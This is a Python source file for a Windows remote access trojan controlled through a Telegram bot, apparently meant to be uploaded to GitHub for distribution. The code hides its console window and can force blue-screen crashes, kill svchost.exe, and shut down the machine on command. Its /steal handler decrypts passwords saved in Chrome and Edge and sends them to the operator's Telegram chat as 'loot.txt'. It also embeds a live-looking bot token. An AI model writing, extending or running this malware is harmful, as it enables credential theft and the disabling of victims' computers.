# bot.py (upload to github as bot.py)
import telebot
import subprocess
import ctypes
import sys
import os
import win32crypt
import sqlite3
import json
import shutil
from threading import Thread
import pythoncom
import win32com.client
import time

BOT_TOKEN = "7956448113:AAFvweSNt8e4OmGWPolHP1Fl9O4y5-Ek8bk"
bot = telebot.TeleBot(BOT_TOKEN)

def hide():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def bsod_fake():
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))

def bsod_real():
    subprocess.call("taskkill /f /im svchost.exe", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

def steal_browser_data():
    paths = [
        os.environ['USERPROFILE'] + r'\AppData\Local\Google\Chrome\User Data\Default',
        os.environ['USERPROFILE'] + r'\AppData\Local\Microsoft\Edge\User Data\Default'
    ]
    data = []
    for path in paths:
        if not os.path.exists(path): continue
        try:
            login_db = os.path.join(path, 'Login Data')
            shutil.copy2(login_db, 'tmp.db')
            conn = sqlite3.connect('tmp.db')
            cursor = conn.cursor()
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            for row in cursor.fetchall():
                pwd = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1]
                data.append(f"{row[0]} | {row[1]} | {pwd.decode()}")
            conn.close()
            os.remove('tmp.db')
        except: pass
    return "\n".join(data) if data else "нихуя"

@bot.message_handler(commands=['off'])
def shutdown(m):
    subprocess.call("shutdown /s /t 0", shell=True)

@bot.message_handler(commands=['fakebsod'])
def fake(m):
    Thread(target=bsod_fake).start()

@bot.message_handler(commands=['realbsod'])
def real(m):
    Thread(target=bsod_real).start()

@bot.message_handler(commands=['cancel'])
def cancel(m):
    pass  # fake bsod no cancel

@bot.message_handler(commands=['explorer'])
def exp(m):
    subprocess.Popen("explorer.exe")

@bot.message_handler(commands=['steal'])
def steal(m):
    data = steal_browser_data()
    with open("loot.txt", "w", encoding="utf-8") as f:
        f.write(data)
    bot.send_document(m.chat.id, open("loot.txt", "rb"))
    os.remove("loot.txt")

def run():
    hide()
    while True:
        try:
            bot.polling(none_stop=True)
        except: time.sleep(5)

if __name__ == "__main__":
    run()
